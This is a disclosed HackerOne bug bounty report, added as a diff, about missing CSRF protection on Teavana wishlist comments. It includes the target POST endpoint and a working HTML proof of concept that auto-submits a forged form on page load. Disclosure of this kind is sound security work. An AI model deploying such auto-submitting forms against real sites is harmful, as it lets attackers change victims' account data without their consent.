@@ -1,0 +1,48 @@
+ReportLink:https://hackerone.com/reports/177639
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/faisalahmed
+ReportedTo:Starbucks(starbucks)
+BountyAmount:375.0
+Severity:medium
+State:Closed
+DateOfDisclosure:13.02.2017 22:47:44
+
+Summary:
+
+Hello Team,
+I noticed there is no CSRF protection in Adding/Editing comment of wishlist items.
+
+AREA: https://www.teavana.com/us/en/my-wishlist
+
+Attacker could take advantage of this issue and exploit victim remotely.
+
+####POC:
+Method: **POST**
+
+POST URL: https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/C1495572478
+*here `C1495572478` is wishlist id number*
+Post Contents:
+```
+wishlistComment=comment
+```
+
+HTML POC to reproduce:
+```
+<html>
+<head><title>CSRF POC</title></head>
+<body onLoad="document.forms[0].submit()">
+<form action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/C1495572478" method="POST">
+<input type="text" name="wishlistComment" value="comment"><br>
+<input type="text" name="save" value="Save"><br>
+</form>
+</body>
+</html>
+```
+
+* Save this snippet as HTML.
+* Make your victim visit the snippet/link.
+* comment will be added/edited automatically.
+
+Hope you'll fix this one.
+
+Looking forward!
